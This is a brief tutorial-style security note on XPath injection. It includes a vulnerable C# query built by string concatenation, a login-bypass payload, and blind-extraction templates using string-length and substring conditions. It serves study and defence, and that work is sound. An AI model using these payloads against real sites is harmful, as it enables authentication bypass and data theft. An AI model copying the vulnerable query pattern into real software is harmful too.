# XPATH Injection

## What
Similar to SQL Injection, XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the XML data is being used for authentication (such as an XML based user file).

Querying XML is done with XPath, a type of simple descriptive statement that allows the XML query to locate a piece of information. Like SQL, you can specify certain attributes to find, and patterns to match. When using XML for a web site it is common to accept some form of input on the query string to identify the content to locate and display on the page. This input must be sanitized to verify that it doesn’t mess up the XPath query and return the wrong data.

XPath is a standard language; its notation/syntax is always implementation independent, which means the attack may be automated. There are no different dialects as it takes place in requests to the SQL databases.

Because there is no level access control it’s possible to get the entire document. We won’t encounter any limitations as we may know from SQL injection attacks.

## Example

Basic XPath queries consist of path expressions. `/` will select from the root node, while `//` will select nodes no matter where they are in the document.

```csharp
String FindUserXPath;
FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And Password/text()='" + Request("Password") + "']";
```

Username: `admin' or 1=1 or 'a'='a`  
Password: `asdf`  

```
//Employee[
    UserName/text()='admin' or 1=1 
    or 
    'a'='a' And Password/text()='asdf'
]";
```

We can select all `<usernames>` from the XML document, and the password bit becomes irrelevant.  

## Blind
`//user[username/text()='' or BOOLEAN_CONDITION or 'a'='a' And password/text()='test']`  

Like SQL's `substring()`, this is our vector to confirming things when blind. Because of boolean algebra, since the password bit is always true, we will be returned with false or true solely depending on `BOOLEAN CONDITION`.

### Boolean Conditions Examples:

- `string-length(//user[position()=USER_POSITION]/child::node()[position()=NODE_POSITION])=TESTLENGTH`

- `substring((//user[position()={user_position}]/child::node()[position()={node_position}]),{i},1)='{char}'`


## Resources
- [OWASP](https://owasp.org/www-community/attacks/XPATH_Injection)
- [OWASP - Blind](https://owasp.org/www-community/attacks/Blind_XPath_Injection)
- [w3s](https://www.w3schools.com/xml/xpath_syntax.asp)
- [zeyu2001](https://dev.to/zeyu2001/blind-xpath-injections-the-path-less-travelled-ope) (the clean script came from here)